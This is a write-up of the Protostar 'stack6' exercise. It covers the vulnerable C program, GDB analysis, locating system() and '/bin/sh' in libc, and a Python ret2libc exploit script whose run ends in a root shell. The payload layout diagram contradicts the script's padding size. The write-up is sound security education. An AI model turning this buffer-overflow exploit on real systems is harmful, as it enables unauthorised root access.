# Stack6 Solution

## C Code

Stack6 looks at what happens when you have restrictions on the return address.

This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , 
or even return orientated programming.

It is strongly suggested you experiment with multiple ways of getting your code to execute here.

This level is at /opt/protostar/bin/stack6

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

## Ret2Libc

Ok, so now we have a C program that takes in a input with `gets()` (which is vulnerable), then checks the return address, and if the return address starts with
`0xbf000000`, you lose. The objective of this challenge is to get a **root shell**, just like last time.

Let's now make see what we can and can't return to. First of all, in some of these older Linux systems `0xbf000000` was the "prefix" used to identify 
**stack values**. So if we cannot return to the stack, what else can we do? Well, can't we return to the huge C library, **libc**? Yes we can! 
We can bypass this stack check by using **ret2libc** (return to libc), then execute the `system("/bin/sh")` to get a shell.

## Exploit

Ok, so now let's get our memory addresses and exploit script.

First of all, open `./stack6` in GDB and disassemble `getpath()` since `main()` just calls `getpath()`:

```bash

user@protostar:/opt/protostar/bin$ gdb stack6
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) set disassembly-flavor intel
(gdb) disas getpath
Dump of assembler code for function getpath:
0x08048484 <getpath+0>: push   ebp
0x08048485 <getpath+1>: mov    ebp,esp
0x08048487 <getpath+3>: sub    esp,0x68
0x0804848a <getpath+6>: mov    eax,0x80485d0
0x0804848f <getpath+11>:        mov    DWORD PTR [esp],eax
0x08048492 <getpath+14>:        call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:        mov    eax,ds:0x8049720
0x0804849c <getpath+24>:        mov    DWORD PTR [esp],eax
0x0804849f <getpath+27>:        call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:        lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:        mov    DWORD PTR [esp],eax
0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
0x080484af <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]
0x080484b2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
0x080484b5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
0x080484b8 <getpath+52>:        and    eax,0xbf000000
0x080484bd <getpath+57>:        cmp    eax,0xbf000000
0x080484c2 <getpath+62>:        jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:        mov    eax,0x80485e4
0x080484c9 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
0x080484cc <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
0x080484d0 <getpath+76>:        mov    DWORD PTR [esp],eax
0x080484d3 <getpath+79>:        call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:        mov    DWORD PTR [esp],0x1
0x080484df <getpath+91>:        call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:        mov    eax,0x80485f0
0x080484e9 <getpath+101>:       lea    edx,[ebp-0x4c]
0x080484ec <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
0x080484f0 <getpath+108>:       mov    DWORD PTR [esp],eax
0x080484f3 <getpath+111>:       call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:       leave  
0x080484f9 <getpath+117>:       ret    
End of assembler dump.
(gdb) 
```

Now set a breakpoint at `getpath+117`

```bash
(gdb) break *getpath+117
Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23.
```

And run with the `QQQQWWWWEEEERRRRTTTTYYYY...` input and examine at eight words as hexadecimal at ESP.

```bash
(gdb) r
Starting program: /opt/protostar/bin/stack6 
input path please: QQQQWWWWEEEERRRRTTTTYYYYUUUUIIIIOOOOPPPPAAAASSSSDDDDFFFFGGGGHHHHJJJJKKKKLLLLZZZZXXXXCCCCVVVVBBBBNNNNMMMM
got path QQQQWWWWEEEERRRRTTTTYYYYUUUUIIIIOOOOPPPPAAAASSSSDDDDFFFFGGGGHHHHXXXXKKKKLLLLZZZZXXXXCCCCVVVVBBBBNNNNMMMM

Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
23      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) X/8wx $esp
0xbffff79c:     0x58585858      0x43434343      0x56565656      0x42424242
0xbffff7ac:     0x4e4e4e4e      0x4d4d4d4d      0xbffff800      0xbffff85c
(gdb) 
```

Now that we know the stack has been filled up with our letters (run `x/8ws $esp` to see proof), let's get the address of `/bin/sh` and `system()`.
In 32 bit architecture, function parameters are stored on the stack, so we will have to put the memory address of `/bin/sh` on the stack. Luckily libc provides us
with a `/bin/sh` already, so we just have to find the memory address of it.

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) info proc map
(gdb) info proc map
process 3211
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0        
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0        
        0xb7fde000 0xb7fe2000     0x4000          0        
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) 
```

`info proc map` shows us the stuff that the program's process is using and this includes libc.
In this case, libc is hidden in `/lib/libc-2.11.2.so`, or `0xb7e97000`.

Now let's see what is at `0xb7e97000`

```
(gdb) x/s 0xb7e97000
0xb7e97000:      "\177ELF\001\001\001"
(gdb)
```

We got the string at that address, but it isn't `/bin/sh`. That is because the memory address points
to the beginning, which is something else (this is my guess, I could not find any info). Now let's
exit GDB and use `strings` and `grep` to find the offset of `/bin/sh`.

```bash
(gdb) quit
A debugging session is active.

        Inferior 1 [process 3211] will be killed.

Quit anyway? (y or n) y
user@protostar:/opt/protostar/bin$ strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
 11f3bf /bin/sh
user@protostar:/opt/protostar/bin$ 
```

Ok, so the address to `/bin/sh` is `0xb7e97000` + `0x11f3bf`. Let's check that with GDB again

```bash
user@protostar:/opt/protostar/bin$ gdb stack6
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) break *getpath+117
Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23.
(gdb) r
Starting program: /opt/protostar/bin/stack6 
input path please: HSDFKJGHSJKFGHFJKLHGSKFJGHSJKFHSKFGHSJKDFGHKJSDFGHKSFGHKFGHSKLDFGHSDKLFJH
got path HSDFKJGHSJKFGHFJKLHGSKFJGHSJKFHSKFGHSJKDFGHKJSDFGHKSFGHKFGHSKLDFKLFJH

Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
23      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) x/s 0xb7e97000 + 0x11f3bf
0xb7fb63bf:      "/bin/sh"
(gdb) 
```

The address checks out! Finally, we got everything we need, so let's get our exploit.

Here is a payload layout to visualize:

```
[ 72 bytes padding ]
[ 4 bytes to overwrite ret ]
[ 4 bytes to overwrite saved EBP ]
[ 4 bytes to return to system ]
[ 4 bytes of a dummy return address (executes after system call, but needed) ]
[ 4 bytes that point to /bin/sh ]
```

Here is our exploit script:

```python
import struct

padding = "A" * 76 # 4 extra bytes for the extra variable
ebp = "LLLL"
system = struct.pack("I", 0xb7ecffb0)
ret = "AAAA"
bin_sh = struct.pack("I", 0xb7fb63bf)

print(padding + ebp + system + ret + bin_sh)
```

Result:

```bash
user@protostar:/opt/protostar/bin$ (python /tmp/exploit.py; cat) | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAALLLL����AAAA�c��
whoami
root
id 
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
echo "get pwned ;)"
get pwned ;)
pwd
/opt/protostar/bin
ls
final0  final2   format1  format3  heap0  heap2  net0  net2  net4    stack1  stack3  stack5  stack7
final1  format0  format2  format4  heap1  heap3  net1  net3  stack0  stack2  stack4  stack6
```
 
## Resources

* [C Code](https://exploit.education/protstar/stack-six/)
* [LiveOverflow's Solution](https://www.youtube.com/watch?v=m17mV24TgwY&ab_channel=LiveOverflow)
